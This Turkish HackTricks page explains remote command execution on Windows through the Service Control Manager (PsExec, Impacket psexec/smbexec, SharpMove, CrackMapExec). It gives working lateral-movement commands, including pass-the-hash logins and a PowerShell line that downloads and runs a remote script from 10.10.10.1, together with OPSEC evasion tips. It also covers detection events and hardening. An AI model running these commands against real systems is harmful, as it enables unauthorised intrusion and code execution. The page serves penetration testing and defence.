# Uzaktan Servis Çalıştırma (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Nasıl çalışırlar

Bu teknikler, hedef bir bilgisayarda komut çalıştırmak için SMB/RPC üzerinden Windows Service Control Manager'ı (SCM) uzaktan kullanır. Service Control Manager Remote Protocol (SCMR), uzak bir bilgisayardaki Windows servislerini yapılandırıp denetlemeye yönelik RPC tabanlı arayüzdür. Yeterli izinlere sahip bir operatör, ikili dosya yolu komut içeren bir servis oluşturabilir veya yeniden yapılandırabilir, ardından komutu uzaktan çalıştırmak için servisi başlatabilir.<sup>[[5]](#references)</sup> Genel işleyiş şöyledir:

1. SMB/RPC (TCP/445) üzerinden hedefte kimlik doğrulaması yapın; seçilen yöntemin dosya bırakması veya çıktıyı buradan alması gerekiyorsa ADMIN$ paylaşımına erişin.
2. Servisin çalıştıracağı bir yürütülebilir dosyayı kopyalayın veya bir LOLBAS komut satırı belirtin.
3. Bu komuta ya da ikili dosyaya işaret eden bir servisi SCM aracılığıyla (\PIPE\svcctl üzerinden MS-SCMR) uzaktan oluşturun.
4. Payload'ı çalıştırmak için servisi başlatın ve isteğe bağlı olarak adlandırılmış bir pipe üzerinden stdin/stdout'u yakalayın.
5. Servisi durdurun ve temizleyin (servisi ve bırakılan tüm ikili dosyaları silin).

Gereksinimler/ön koşullar:
- Hedefte Local Administrator yetkisi (SeCreateServicePrivilege) veya hedefte açık servis oluşturma izinleri.
- SMB'ye (445) erişilebilmeli ve ana bilgisayar güvenlik duvarında Remote Service Management'a izin verilmeli; dosya bırakmak veya çıktı almak için ADMIN$ kullanan yöntemlerde bu paylaşım kullanılabilir olmalı.
- UAC Remote Restrictions: yerel hesaplarda, yerleşik Administrator hesabı kullanılmadığı veya LocalAccountTokenFilterPolicy=1 olarak ayarlanmadığı sürece token filtreleme, yönetici erişimini ağ üzerinden engelleyebilir.
- Kerberos ve NTLM: ana bilgisayar adı/FQDN kullanmak Kerberos'u etkinleştirir; IP ile bağlanmak çoğunlukla NTLM'e geri döner (bu, sıkılaştırılmış ortamlarda engellenebilir).

Bir servis hesabı belirtilmezse `CreateService`, kapsamlı yerel ayrıcalıklara sahip olan `LocalSystem` hesabını kullanır. Bu, SCM üzerinden başarılı bir çalıştırmanın neden yüksek etkiye sahip olduğunu açıklar. Bu işlem UAC'yi veya Microsoft Defender'ı kendiliğinden devre dışı bırakmaz: çağıranın hâlâ uzak SCM izinlerine ihtiyacı vardır ve uç nokta denetimleri servisi veya payload'ı inceleyebilir ya da engelleyebilir.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### sc.exe ile Manuel ScExec/WinExec

Aşağıda servis oluşturmak için en temel yöntem gösterilmiştir. Servis imajı, bırakılmış bir EXE veya cmd.exe ya da powershell.exe gibi bir LOLBAS olabilir.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notlar:
- Service olmayan bir EXE başlatırken zaman aşımı hatası bekleyin; çalıştırma yine de gerçekleşir.
- OPSEC açısından daha güvenli kalmak için fileless komutları (cmd /c, powershell -enc) tercih edin veya bırakılan artifact'leri silin.

Daha ayrıntılı adımlar için: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Araçlar ve örnekler

### Sysinternals PsExec.exe

- SMB kullanarak PSEXESVC.exe'yi ADMIN$'a bırakan, geçici bir servis yükleyen (varsayılan adı PSEXESVC) ve I/O'yu named pipe'lar üzerinden proxy'leyen klasik bir yönetici aracı.
- Örnek kullanımlar:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Sysinternals Live üzerinden WebDAV aracılığıyla doğrudan başlatabilirsiniz:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Hizmet yükleme/kaldırma olayları bırakır (hizmet adı, `-r` kullanılmadığı sürece genellikle PSEXESVC olur) ve çalıştırma sırasında `C:\Windows\PSEXESVC.exe` dosyasını oluşturur.

### Impacket psexec.py (PsExec benzeri)

- İçinde RemCom benzeri bir hizmet bulunur. ADMIN$ üzerinden geçici bir hizmet ikilisi (genellikle rastgele adlandırılmış) bırakır, bir hizmet oluşturur (varsayılanı genellikle RemComSvc) ve G/Ç'yi adlandırılmış bir pipe üzerinden yönlendirir.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Kali'de Impacket örnekleri `/usr/share/doc/python3-impacket/examples/` altında bulunabilir. Parola sağlanmazsa araç parola ister. Impacket'teki `-k`, NTLM yerine Kerberos kimlik doğrulaması ister; genellikle geçerli kimlik bilgisi önbelleğini veya sağlanan kimlik bilgilerini kullanır.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefaktlar
- C:\Windows\ konumunda geçici EXE (rastgele 8 karakter). Üzerine yazılmadığı sürece hizmet adı varsayılan olarak RemComSvc olur.

### Impacket smbexec.py (SMBExec)

- cmd.exe’yi başlatan geçici bir hizmet oluşturur ve G/Ç için named pipe kullanır. Genellikle tam bir EXE payload bırakmaz; komut yürütme yarı etkileşimlidir.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#), service-based exec dahil olmak üzere çeşitli lateral movement yöntemlerini uygular.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove), SCM üzerinden ve servis değiştirme/oluşturma dahil diğer bazı Windows mekanizmaları aracılığıyla kimliği doğrulanmış uzaktan yürütmeyi destekler.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Farklı backend'ler (psexec/smbexec/wmiexec) üzerinden çalıştırmak için CrackMapExec'i de kullanabilirsiniz:

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SharpMove ile SCMExec

SCM action, `WindowsDebug` adlı bir service oluşturur ve onu uzak host'ta zaten bulunan bir payload'a yönlendirir.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, tespit ve artefaktlar

PsExec benzeri teknikler kullanıldığında tipik host/ağ artefaktları:
- Hedefte kullanılan admin hesabı için Security 4624 (Logon Type 3) ve 4672 (Special Privileges).
- ADMIN$ erişimini ve servis ikililerinin oluşturulmasını/yazılmasını gösteren Security 5140/5145 File Share ve File Share Detailed olayları (ör. PSEXESVC.exe veya rastgele 8 karakterli bir .exe).
- Hedefte servis kurulumu için Service Control Manager kaynaklı **System** 7045: PSEXESVC, RemComSvc veya özel adlar (`-r` / `-service-name`). Bu, servisin kurulduğunu kanıtlar; imajının çalıştırıldığını değil. Zaman damgasını ve imaj yolunu, varsa süreç olaylarıyla veya eşleşen bir service-image prefetch girdisiyle ilişkilendirin.<sup>[[4]](#references)</sup>
- services.exe veya servis imajı için Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ içindeki dosyalar için 11 (File Create), \\.\pipe\psexesvc, \\.\pipe\remcom_* veya rastgele benzerleri gibi pipe'lar için 17/18 (Pipe Created/Connected).
- Sysinternals EULA için Registry artefaktı: operatör hostundaki HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (bastırılmadıysa).

Avcılık fikirleri
- ImagePath içinde cmd.exe /c, powershell.exe veya TEMP konumları bulunan servis kurulumları için uyarı oluşturun.
- ParentImage değeri C:\Windows\PSEXESVC.exe olan veya services.exe alt süreçleri olarak LOCAL SYSTEM ile çalışan ve shell yürüten süreç oluşturma olaylarını arayın.
- -stdin/-stdout/-stderr ile biten veya bilinen PsExec clone pipe adlarını kullanan named pipe'ları işaretleyin.

## Yaygın sorunları giderme
- Servis oluşturulurken erişim reddedildi (5): Gerçekten local admin değilsiniz, yerel hesaplar için UAC uzak kısıtlamaları devrede ya da EDR servis ikilisi yolunda müdahaleyi engelliyor.
- Ağ yolu bulunamadı (53) veya bağlantı kurulamadı: Güvenlik duvarı SMB/RPC'yi engelliyor ya da admin share'leri devre dışı.
- Kerberos başarısız oluyor ancak NTLM engelleniyor: IP yerine hostname/FQDN kullanın, uygun SPN'lerin olduğundan emin olun veya Impacket kullanırken biletlerle -k/-no-pass sağlayın.
- Servis başlatma zaman aşımına uğruyor ama payload çalıştı: Gerçek bir servis ikilisi değilse bu beklenen bir durumdur; çıktıyı bir dosyaya kaydedin veya canlı I/O için smbexec kullanın.

## Güçlendirme notları
- Windows 11 24H2 ve Windows Server 2025, giden bağlantılarda (ve Windows 11'de gelen bağlantılarda) varsayılan olarak SMB signing gerektirir. Bu, geçerli kimlik bilgileriyle yapılan meşru PsExec kullanımını bozmaz ancak imzasız SMB relay istismarını önler ve signing desteklemeyen cihazları etkileyebilir.<sup>[[2]](#references)</sup>
- Yeni SMB client NTLM engellemesi (Windows 11 24H2/Server 2025), IP ile veya Kerberos kullanmayan sunuculara bağlanırken NTLM fallback işlemini engelleyebilir. Güçlendirilmiş ortamlarda bu, NTLM tabanlı PsExec/SMBExec'i bozacaktır; Kerberos kullanın (hostname/FQDN) veya meşru olarak gerekiyorsa istisnalar yapılandırın.<sup>[[2]](#references)</sup>
- En az ayrıcalık ilkesi: local admin üyeliğini en aza indirin, Just-in-Time/Just-Enough Admin'i tercih edin, LAPS'i zorunlu kılın ve 7045 servis kurulumlarını izleyip uyarı oluşturun.

## Ayrıca bkz.

- WMI tabanlı uzak exec (çoğunlukla daha az dosya izi bırakır):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM tabanlı uzak exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 ve Windows 11'de SMB güvenlik güçlendirmesi](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Windows makinelerini ele geçirmek için kimlik bilgilerini kullanma - Bölüm 2 (PSExec ve servisler)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Sistem olay günlüklerini kullanarak beklenmeyen yeniden başlatmaları giderme](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Service Control Manager Remote Protocol genel bakış](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - LocalSystem hesabı](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - `CreateService` işlevi](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
